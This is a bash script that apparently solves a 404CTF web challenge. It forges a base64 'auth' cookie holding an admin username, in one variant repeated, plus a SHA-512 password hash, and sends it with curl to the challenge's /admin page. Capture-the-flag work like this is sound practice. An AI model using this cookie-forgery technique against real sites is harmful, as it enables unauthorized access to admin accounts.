#!/usr/bin/env bash
username='admin'
password=$(echo -n 'seth' | sha512sum)
password="66651013935b4c2c31d9baba8fa5d37b809b10da453f293ec8f9a7fbb2ab2e2c1d69dc8d80969508028b5ec14e9d1de585929a4c0d534996744b495c325e3f3d"

auth=$(echo -n "username=$username;password=$password" | base64 -w 0)
auth=$(echo -n "username=Admin;username=admin;password=$password" | base64 -w 0)
auth=$(echo -n "username=admin;password=$password" | base64 -w 0)

curl "https://du-gateau.404ctf.fr/admin" \
  -H 'authority: du-gateau.404ctf.fr' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'accept-language: fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6' \
  -H 'cache-control: max-age=0' \
  -H "cookie: auth=$auth=" \
-H 'dnt: 1' \
  -H 'referer: https://du-gateau.404ctf.fr/forgot_password/admin' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36' \
  --compressed \
  -w "%{http_code}"
